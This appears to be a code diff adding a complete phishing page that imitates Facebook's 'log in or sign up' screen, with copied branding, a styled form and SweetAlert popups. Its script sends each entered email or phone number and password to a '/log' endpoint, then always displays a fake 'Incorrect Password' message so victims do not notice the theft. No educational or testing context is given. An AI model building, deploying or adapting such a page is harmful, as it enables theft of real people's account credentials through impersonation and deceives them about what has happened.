@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Facebook – log in or sign up</title>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .login-container .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 80px;
+    }
+
+    .login-container h2 {
+      text-align: center;
+      color: #1877f2;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 36px;
+      margin-bottom: 20px;
+    }
+
+    .login-container input {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    .login-container input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 1px #1877f2;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-container button:hover {
+      background-color: #145dbf;
+    }
+
+    @media (max-width: 400px) {
+      .login-container {
+        padding: 25px 20px;
+      }
+
+      .login-container h2 {
+        font-size: 28px;
+      }
+
+      .login-container input,
+      .login-container button {
+        font-size: 14px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <!-- Facebook Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo" />
+
+    <h2>facebook</h2>
+    <input type="text" id="email" placeholder="Email or phone number" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="handleLogin()">Log In</button>
+  </div>
+
+  <script>
+  function fbStylePopup(title, message) {
+    Swal.fire({
+      title: title,
+      text: message,
+      icon: 'error',
+      confirmButtonText: 'Try Again'
+    });
+  }
+
+  function handleLogin() {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!email || !password) {
+      return fbStylePopup("Missing Info", "Please enter both email/number and password.");
+    }
+
+    if (!validateEmail(email) && !validatePhoneNumber(email)) {
+      return fbStylePopup("Invalid Input", "Please enter a valid email or phone number.");
+    }
+
+    if (password.length < 6) {
+      return fbStylePopup("Weak Password", "Password must be at least 6 characters.");
+    }
+
+    Swal.fire({
+      title: 'Logging in...',
+      allowOutsideClick: false,
+      didOpen: () => Swal.showLoading()
+    });
+
+    fetch("/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password })
+    })
+    .then(() => {
+      setTimeout(() => {
+        Swal.close();
+        fbStylePopup("Incorrect Password", "The password you entered is incorrect.");
+      }, 1500);
+    })
+    .catch(err => {
+      Swal.close();
+      fbStylePopup("Error", "Something went wrong.");
+    });
+  }
+
+  function validateEmail(email) {
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailPattern.test(email);
+  }
+
+  function validatePhoneNumber(phone) {
+    const phonePattern = /^[0-9]{10,15}$/;
+    return phonePattern.test(phone);
+  }
+  </script>
+
+</body>
+</html>
